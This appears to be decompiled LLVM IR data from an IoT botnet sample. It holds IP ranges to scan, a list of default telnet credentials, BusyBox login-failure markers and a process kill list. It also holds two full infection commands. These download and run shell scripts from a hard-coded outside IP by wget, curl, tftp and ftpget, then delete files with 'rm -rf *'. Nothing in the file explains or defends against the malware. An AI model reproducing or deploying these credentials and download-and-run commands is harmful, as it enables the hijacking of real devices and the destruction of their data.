source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@global_var_10030000.1 = global i32 0
@global_var_1002c3b0.3 = global i32 0
@global_var_1002c3bc.4 = local_unnamed_addr global i32* @global_var_1002c3b0.3
@global_var_1002c968.7 = global i32 0
@global_var_1002c3b4.8 = global i32 0
@global_var_1002c980.9 = global i32 0
@global_var_1002c984.10 = local_unnamed_addr global i32 0
@global_var_1002c988.11 = local_unnamed_addr global i32 0
@global_var_1002c4ec.12 = local_unnamed_addr global i32 4095
@global_var_1002c4e8.13 = local_unnamed_addr global i32 362436
@global_var_100160e4.14 = constant [7 x i8] c"(null)\00"
@global_var_1002c900.15 = local_unnamed_addr global i32 0
@global_var_100013c0.16 = constant i32 1208009457
@global_var_1000140c.17 = constant i32 939589631
@global_var_10001460.18 = constant i32 1207959608
@global_var_100160ec.19 = constant [8 x i8] c"/bin/sh\00"
@global_var_100160f4.20 = constant [3 x i8] c"sh\00"
@global_var_100160f8.21 = constant [3 x i8] c"-c\00"
@global_var_100014c0.22 = constant [3 x i8] c"8`\00"
@global_var_100014f0.23 = constant i32 1207959576
@global_var_100160fc.24 = constant i32 -1
@global_var_100164fc.25 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1001650c.26 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_10001ce8.27 = constant i32 939524096
@global_var_10001d34.28 = constant i32 939524097
@global_var_10001f28.29 = constant i32 939524126
@global_var_1002c8e0.30 = local_unnamed_addr global i32 0
@global_var_10016518.31 = constant [5 x i8] c"PING\00"
@global_var_10002024.32 = constant i32 939524126
@global_var_10016520.33 = constant [14 x i8] c"gethostbyname\00"
@global_var_10002248.34 = constant i32 939524097
@global_var_100022c4.35 = constant i32 939524096
@global_var_10002358.36 = constant i32 939524098
@global_var_10002560.37 = constant i32 939524097
@global_var_1002c8e8.38 = global i32 0
@global_var_1002c8ec.39 = local_unnamed_addr global i32 0
@global_var_1002c914.40 = local_unnamed_addr global i32 0
@global_var_100028d8.41 = constant i32 939524096
@global_var_10016530.42 = constant [6 x i8] c":>%$#\00"
@global_var_10016538.48 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_10016544.49 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_10016554.50 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_10016560.51 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_10016570.52 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_1001657c.53 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_1001658c.54 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_10016598.55 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_100165a8.56 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_100165b8.57 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_100165c8.58 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_100165d8.59 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_100165e4.60 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_100165f4.61 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_10016604.62 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_10016614.63 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_10016624.64 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_10016634.65 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_10016644.66 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_10016654.67 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_10016660.68 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_1001666c.69 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_1001667c.70 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_10016688.71 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_10016694.72 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_100166a0.73 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_100166ac.74 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_100166b8.75 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_100166c8.76 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_100166d8.77 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_100166e4.78 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_100166f4.79 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_10016700.80 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_1001670c.81 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_10016718.82 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_10016724.83 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_10016730.84 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_1001673c.85 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_10016748.86 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_10016758.87 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_10016768.88 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_10016778.89 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_10016788.90 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_10016798.91 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_100167a8.92 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_100167b8.93 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_100167c8.94 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_100167d8.95 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_100167e8.96 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_100167f8.97 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_10016808.98 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_10016818.99 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_10016828.100 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_10016838.101 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_10016848.102 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_10016858.103 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_10016868.104 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_10016878.105 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_10016888.106 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_10016898.107 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_100168a8.108 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_100168b8.109 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_100168c8.110 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_100168d8.111 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_100168e8.112 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_100168f8.113 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_10016908.114 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_10016918.115 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_10016928.116 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_10016938.117 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_10016948.118 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_10016958.119 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_10016968.120 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_10016978.121 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_10016988.122 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_10016998.123 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_100169a8.124 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_100169b8.125 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_100169c8.126 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_100169d8.127 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_100169e8.128 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_100169f8.129 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_10016a08.130 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_10016a18.131 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_10016a28.132 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_10016a38.133 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_10016a48.134 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_10016a58.135 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_10016a68.136 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_10016a78.137 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_10016a88.138 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_10016a98.139 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_10016aa8.140 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_10016ab8.141 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_10016ac8.142 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_10016ad8.143 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_10016ae8.144 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_10016af8.145 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_10016b08.146 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_10016b14.147 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_10016b24.148 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_10016b34.149 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_10016b44.150 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_10016b50.151 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_10016b60.152 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_10016b70.153 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_10016b80.154 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_10016b90.155 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_10016ba0.156 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_10016bb0.157 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_10016bc0.158 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_10016bd0.159 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_10016be0.160 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_10016bf0.161 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_10016c00.162 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_10016c10.163 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_10016c20.164 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_10016c30.165 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_10016c40.166 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_10016c4c.167 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_10016c5c.168 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_10016c6c.169 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_10016c7c.170 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_10016c8c.171 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_10016c9c.172 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_10016cac.173 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_10016cbc.174 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_10016ccc.175 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_10016cdc.176 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_10016cec.177 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_10016cfc.178 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_10016d0c.179 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_10016d1c.180 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_10016d2c.181 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_10016d3c.182 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_10016d4c.183 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_10016d5c.184 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_10016d6c.185 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_10016d7c.186 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_10016d8c.187 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_10016d9c.188 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_10016dac.189 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_10016dbc.190 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_10016dcc.191 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_10016ddc.192 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_10016dec.193 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_10016dfc.194 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_10016e0c.195 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_10016e1c.196 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_10016e2c.197 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_10016e3c.198 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_10016e48.199 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_10016e58.200 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_10016e68.201 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_10016e78.202 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_10016e88.203 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_10016e98.204 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_10016ea8.205 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_10016eb8.206 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_10016ec8.207 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_10016ed8.208 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_10016ee8.209 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_10016ef8.210 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_10016f08.211 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_10016f18.212 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_10016f28.213 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_10016f38.214 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_10016f48.215 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_10016f58.216 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_10016f68.217 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_10016f78.218 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_10016f88.219 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_10016f98.220 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_10016fa8.221 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_10016fb8.222 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_10016fc8.223 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_10016fd8.224 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_10016fe8.225 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_10016ff8.226 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_10017008.227 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_10017018.228 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_10017028.229 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_10017038.230 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_10017048.231 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_10017058.232 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_10017068.233 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_10017078.234 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_10017088.235 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_10017098.236 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_100170a8.237 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_100170b8.238 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_100170c8.239 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_100170d8.240 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_100170e8.241 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_100170f8.242 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_10017108.243 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_10017118.244 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_10017128.245 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_1002c4f0.246 = global i32 110
@global_var_10017138.247 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_1002c908.248 = local_unnamed_addr global i32 0
@global_var_100079e8.249 = constant i32 939524096
@global_var_100160d0.250 = constant [8 x i8] c"BusyBox\00"
@global_var_100160d8.251 = constant i32 603979776
@global_var_100160dc.252 = constant i32 587202560
@global_var_100160e0.253 = constant [3 x i8] c"~#\00"
@global_var_1002c4a8.254 = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100160d0.250, i32 0, i32 0), i8* bitcast (i32* @global_var_100160d8.251 to i8*), i8* bitcast (i32* @global_var_100160dc.252 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100160e0.253, i32 0, i32 0)]
@global_var_10016098.255 = constant [7 x i8] c"nvalid\00"
@global_var_100160a0.256 = constant [6 x i8] c"ailed\00"
@global_var_100160a8.257 = constant [9 x i8] c"ncorrect\00"
@global_var_100160b4.258 = constant [6 x i8] c"enied\00"
@global_var_100160bc.259 = constant [5 x i8] c"rror\00"
@global_var_100160c4.260 = constant [7 x i8] c"oodbye\00"
@global_var_100160cc.261 = constant [4 x i8] c"bad\00"
@global_var_1002c488.262 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10016098.255, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100160a0.256, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100160a8.257, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100160b4.258, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100160bc.259, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100160c4.260, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100160cc.261, i32 0, i32 0)]
@global_var_10007e60.263 = constant i32 939524098
@global_var_10007f1c.264 = constant i32 939524096
@global_var_100171c4.265 = constant i32 -61788
@global_var_10015d10.270 = constant [7 x i8] c"666666\00"
@global_var_10015d18.271 = constant [8 x i8] c"support\00"
@global_var_10015d24.272 = constant [8 x i8] c"default\00"
@global_var_10015d30.273 = constant [5 x i8] c"root\00"
@global_var_10015d38.274 = constant [6 x i8] c"admin\00"
@global_var_10015d40.275 = constant [11 x i8] c"supervisor\00"
@global_var_10015d4c.276 = constant [5 x i8] c"ubnt\00"
@global_var_10015d54.277 = constant i32 0
@global_var_10015d58.278 = constant [5 x i8] c"1234\00"
@global_var_10015d60.279 = constant [7 x i8] c"123456\00"
@global_var_10015d68.280 = constant [5 x i8] c"vnpt\00"
@global_var_10015d70.281 = constant [11 x i8] c"1234567890\00"
@global_var_10015d7c.282 = constant [7 x i8] c"antslq\00"
@global_var_10015d84.283 = constant [9 x i8] c"zyad1234\00"
@global_var_10015d90.284 = constant [5 x i8] c"anko\00"
@global_var_10015d98.285 = constant [5 x i8] c"tini\00"
@global_var_10015da0.286 = constant [8 x i8] c"letacla\00"
@global_var_10015dac.287 = constant [4 x i8] c"5up\00"
@global_var_10015db4.288 = constant [7 x i8] c"xc3511\00"
@global_var_100171e4.297 = constant [711 x i8] c"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A x00\00"
@global_var_100174ac.298 = constant [3 x i8] c"AA\00"
@global_var_100174b4.299 = constant [704 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
@global_var_1000918c.300 = constant i32 1207959564
@global_var_100190d0.301 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_100190e0.302 = constant [6 x i8] c"/tmp/\00"
@global_var_100190e8.303 = constant [6 x i8] c"/var/\00"
@global_var_100190f0.304 = constant [6 x i8] c"/dev/\00"
@global_var_100190f8.305 = constant [10 x i8] c"/var/run/\00"
@global_var_10019104.306 = constant [10 x i8] c"/dev/shm/\00"
@global_var_10019110.307 = constant [6 x i8] c"/mnt/\00"
@global_var_10019118.308 = constant [7 x i8] c"/boot/\00"
@global_var_10019120.309 = constant [6 x i8] c"/usr/\00"
@global_var_10019128.310 = constant [9 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_100190d0.301, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100190e0.302, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100190e8.303, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100190f0.304, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100190f8.305, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10019104.306, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10019110.307, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10019118.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10019120.309, i32 0, i32 0)]
@global_var_10018494.311 = constant [5 x i8] c"wget\00"
@global_var_1001849c.312 = constant [6 x i8] c"armv*\00"
@global_var_100177d8.313 = constant [5 x i8] c"bot*\00"
@global_var_100184a4.314 = constant [6 x i8] c"ntpd*\00"
@global_var_100177ec.315 = constant [7 x i8] c"hackz*\00"
@global_var_100184ac.316 = constant [8 x i8] c"shitty*\00"
@global_var_100184b4.317 = constant [6 x i8] c"jack*\00"
@global_var_100177b0.318 = constant [6 x i8] c"mips*\00"
@global_var_10017790.319 = constant [5 x i8] c"sex*\00"
@global_var_100184bc.320 = constant [4 x i8] c"i86\00"
@global_var_100184c0.321 = constant [5 x i8] c"ssh*\00"
@global_var_100177d0.322 = constant [5 x i8] c"sh4*\00"
@global_var_100177e0.323 = constant [11 x i8] c"jackmeoff*\00"
@global_var_10017798.324 = constant [6 x i8] c"tftp*\00"
@global_var_100184c8.325 = constant [4 x i8] c"i56\00"
@global_var_100184cc.326 = constant [5 x i8] c"mips\00"
@global_var_100184d4.327 = constant [7 x i8] c"mipsel\00"
@global_var_100184dc.328 = constant [4 x i8] c"sh4\00"
@global_var_100184e0.329 = constant [4 x i8] c"x86\00"
@global_var_100184e4.330 = constant [5 x i8] c"i686\00"
@global_var_100184ec.331 = constant [4 x i8] c"ppc\00"
@global_var_100184f0.332 = constant [5 x i8] c"i586\00"
@global_var_100184f8.333 = constant [7 x i8] c"mips64\00"
@global_var_10018500.334 = constant [6 x i8] c"sh2eb\00"
@global_var_10018508.335 = constant [7 x i8] c"sh2elf\00"
@global_var_10018510.336 = constant [4 x i8] c"arm\00"
@global_var_10018514.337 = constant [6 x i8] c"armv5\00"
@global_var_1001851c.338 = constant [8 x i8] c"armv4tl\00"
@global_var_10018524.339 = constant [6 x i8] c"armv4\00"
@global_var_1001852c.340 = constant [6 x i8] c"armv6\00"
@global_var_10018534.341 = constant [8 x i8] c"powerpc\00"
@global_var_1001853c.342 = constant [13 x i8] c"powerpc440fp\00"
@global_var_1001854c.343 = constant [5 x i8] c"m68k\00"
@global_var_10018554.344 = constant [6 x i8] c"sparc\00"
@global_var_1001855c.345 = constant [7 x i8] c"x86_64\00"
@global_var_10018564.346 = constant [11 x i8] c"jackmymips\00"
@global_var_10018570.347 = constant [13 x i8] c"jackmymips64\00"
@global_var_10018580.348 = constant [13 x i8] c"jackmymipsel\00"
@global_var_10018590.349 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_1001859c.350 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_100185ac.351 = constant [10 x i8] c"jackmysh4\00"
@global_var_100185b8.352 = constant [10 x i8] c"jackmyx86\00"
@global_var_100185c4.353 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_100185d0.354 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_100185e0.355 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_100185ec.356 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_100185f8.357 = constant [11 x i8] c"jackmyi686\00"
@global_var_10018604.358 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_10018614.359 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_10018628.360 = constant [11 x i8] c"jackmyi586\00"
@global_var_10018634.361 = constant [11 x i8] c"jackmym68k\00"
@global_var_10018640.362 = constant [12 x i8] c"jackmysparc\00"
@global_var_1001864c.363 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_1001865c.364 = constant [11 x i8] c"hackmymips\00"
@global_var_10018668.365 = constant [13 x i8] c"hackmymips64\00"
@global_var_10018678.366 = constant [13 x i8] c"hackmymipsel\00"
@global_var_10018688.367 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_10018694.368 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_100186a4.369 = constant [10 x i8] c"hackmysh4\00"
@global_var_100186b0.370 = constant [10 x i8] c"hackmyx86\00"
@global_var_100186bc.371 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_100186c8.372 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_100186d8.373 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_100186e4.374 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_100186f0.375 = constant [11 x i8] c"hackmyi686\00"
@global_var_100186fc.376 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_1001870c.377 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_10018720.378 = constant [11 x i8] c"hackmyi586\00"
@global_var_1001872c.379 = constant [11 x i8] c"hackmym68k\00"
@global_var_10018738.380 = constant [12 x i8] c"hackmysparc\00"
@global_var_10018744.381 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_10018754.382 = constant [3 x i8] c"b1\00"
@global_var_10018758.383 = constant [3 x i8] c"b2\00"
@global_var_1001875c.384 = constant [3 x i8] c"b3\00"
@global_var_10018760.385 = constant [3 x i8] c"b4\00"
@global_var_10018764.386 = constant [3 x i8] c"b5\00"
@global_var_10018768.387 = constant [3 x i8] c"b6\00"
@global_var_1001876c.388 = constant [3 x i8] c"b7\00"
@global_var_10018770.389 = constant [3 x i8] c"b8\00"
@global_var_10018774.390 = constant [3 x i8] c"b9\00"
@global_var_10018778.391 = constant [4 x i8] c"b10\00"
@global_var_1001877c.392 = constant [4 x i8] c"b11\00"
@global_var_10018780.393 = constant [4 x i8] c"b12\00"
